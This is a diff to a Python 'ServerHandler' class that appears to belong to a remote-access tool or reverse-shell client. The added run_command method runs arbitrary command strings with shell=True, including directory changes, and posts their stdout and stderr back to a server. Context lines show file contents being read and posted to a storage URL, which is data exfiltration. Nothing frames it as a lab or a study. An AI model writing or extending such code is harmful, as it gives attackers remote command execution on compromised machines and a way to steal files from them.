@@ -9,6 +9,13 @@ class ServerHandler:
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
+ 
+
+    def convert_text(self, text):
+        RESET = "\033[0m"
+        BOLD = "\033[1m"
+        COLOR = "\u001b[36m"
+        return f"{BOLD}{COLOR}{text}{RESET}"
 
 
     # Data is a dict
@@ -36,8 +43,37 @@ class ServerHandler:
             self.send_post(fp.read(), url=store_url)
 
 
+    def send_data(self, data):
+        try:
+            self.send_post(data)
+        except ValueError as e:
+            self.send_post(e)
+            return
+
+
     def run_command(self, command):
-        CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        self.send_post(CMD.stdout.read())
-        self.send_post(CMD.stderr.read())
+        if command[:2] == 'cd' and command != 'cd':
+            try:
+                os.chdir(command[3:])
+                result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
+                                          stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                result = result.stdout.read() + result.stderr.read()
+                result = "\n" + result.decode()
+
+                if "The system cannot find the path specified." in result:
+                    result = "\n"
+                    self.send_post(result)
+                else:
+                    self.send_post(result)
+            except(FileNotFoundError, IOError):
+                error_message = "Directory does not exist!!! \n"
+                self.send_post(error_message)
+
+        else:
+            result = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                      stderr=subprocess.PIPE, shell=True)
+            self.send_post(result.stdout.read())
+            self.send_post(result.stderr.read())
+
+
 
